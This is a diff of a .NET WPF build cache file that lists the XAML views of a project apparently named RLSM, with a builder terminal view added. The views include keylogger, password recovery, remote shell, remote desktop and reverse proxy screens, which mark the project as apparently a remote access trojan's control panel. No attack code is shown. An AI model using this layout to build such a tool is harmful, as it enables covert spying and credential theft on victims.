@@ -10,11 +10,11 @@ none
 false
 TRACE;RELEASE;NETFRAMEWORK;NET48;;NET30_OR_GREATER;NET35_OR_GREATER;NET40_OR_GREATER;NET45_OR_GREATER;NET451_OR_GREATER;NET452_OR_GREATER;NET46_OR_GREATER;NET461_OR_GREATER;NET462_OR_GREATER;NET47_OR_GREATER;NET471_OR_GREATER;NET472_OR_GREATER;NET48_OR_GREATER
 C:\Users\Keylan\Desktop\RLSM.6.04\rslm_frontend\App.xaml
-14-268619701
+15406713795
 
-46224215958
+47-1188927557
 26-1134584327
-MainWindow.xaml;Styles\AvalonDockTheme.xaml;Styles\DataTemplates.xaml;Styles\VsDarkTheme.xaml;Views\FileManagerView.xaml;Views\FileViewer.xaml;Views\KeyloggerView.xaml;Views\PasswordRecoveryView.xaml;Views\RegistryEditorView.xaml;Views\RemoteDesktopView.xaml;Views\RemoteShellView.xaml;Views\ReverseProxyView.xaml;Views\SystemInfoView.xaml;Views\TaskManagerView.xaml;
+MainWindow.xaml;Styles\AvalonDockTheme.xaml;Styles\DataTemplates.xaml;Styles\VsDarkTheme.xaml;Views\BuilderTerminalView.xaml;Views\FileManagerView.xaml;Views\FileViewer.xaml;Views\KeyloggerView.xaml;Views\PasswordRecoveryView.xaml;Views\RegistryEditorView.xaml;Views\RemoteDesktopView.xaml;Views\RemoteShellView.xaml;Views\ReverseProxyView.xaml;Views\SystemInfoView.xaml;Views\TaskManagerView.xaml;
 
 False
 
